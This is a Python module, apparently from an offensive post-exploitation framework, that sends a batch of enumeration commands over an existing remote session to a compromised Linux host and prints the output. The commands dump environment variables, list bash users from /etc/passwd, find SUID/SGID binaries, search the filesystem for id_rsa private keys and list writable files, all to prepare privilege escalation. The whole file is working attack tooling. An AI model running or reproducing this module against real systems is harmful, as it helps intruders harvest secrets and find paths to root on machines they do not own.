import sessions
from module import Module, Type

COMMANDS = [
    'echo "===== General Information =====";',
    'echo "User: $(whoami)";',
    'echo "Groups: $(id)";',
    'echo "Hostname: $(hostname)";',
    'echo "Kernel: $(uname -r)";',
    'echo;',
    'echo "===== Environment Variables =====";',
    'env;',
    'echo;',
    'echo "===== Path =====";',
    'echo $PATH;',
    'echo;',
    'echo "===== Users =====";',
    'cat /etc/passwd | grep bash;',
    'echo;',
    'echo "===== SUID =====";',
    'find / -perm -u=s -type f 2>/dev/null;',
    'echo;',
    'echo "===== SGID =====";',
    'find / -perm -g=s -type f 2>/dev/null;',
    'echo;',
    'echo "===== Processes =====";',
    'ps ux;',
    'echo;',
    'echo "===== Open ports =====";',
    'netstat -tulpn;',
    'echo;',
    'echo "===== RSA Keys =====";',
    'find / -name id_rsa 2>/dev/null;',
    'echo;',
    'echo "===== Writable files (top 50) =====";',
    'find / -writable 2>/dev/null | head -n 50;'
]


class LinuxPrivilegeEscalationSuggester(Module):

    def __init__(self):
        super().__init__("linux_privilege_escalation_suggester",
                         ["linux", "privilege", "escalation", "suggester"],
                         "privilege escalation on linux")

        self.add_option("SESSION-ID", "session id", required=True, default=0, type=Type.int)

    def run(self):
        if self.session_id < 0 or self.session_id >= sessions.count():
            print(f"[-] invalid session id {self.session_id}")
            return

        socket = sessions.get(self.session_id).conn
        socket.send(" ".join(COMMANDS).encode())

        while True:
            try:
                data = socket.recv(sessions.BUFFER_SIZE)
                data = data.decode()
                if not data:
                    break
                print(data, end="")
            except TimeoutError:
                break
